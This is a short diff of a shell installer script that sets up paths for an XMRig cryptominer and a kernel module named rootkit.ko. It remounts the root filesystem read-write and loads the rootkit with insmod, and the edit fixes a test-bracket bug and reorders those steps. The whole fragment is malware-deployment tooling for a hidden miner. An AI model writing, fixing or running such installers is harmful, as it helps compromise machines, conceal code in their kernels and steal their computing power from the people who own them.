@@ -13,16 +13,17 @@ module_dir="/lib/modules/$(uname -r)/extra"
 xmrig_dir="/opt/xmrig/"
 xmrig_binary="$xmrig_dir/xmrig"
 xmrig_config="$xmrig_dir/config.json"
-mount -o remount,rw /
 #compile rootkit
 
 #if extra not real then create it
 #copy compile rootkit.ko to destination
-if [ ! -d "$module_dir"]; then
+if [ ! -d "$module_dir" ]; then
 	mkdir -p "$module_dir"
 fi
 
-cp "$module_compile_dir/rootkit.ko" "$module_dir/rootkit.ko"
+#cp "$module_compile_dir/rootkit.ko" "$module_dir/rootkit.ko"
+
+mount -o remount,rw /
 insmod "$module_dir/rootkit.ko"
 
 
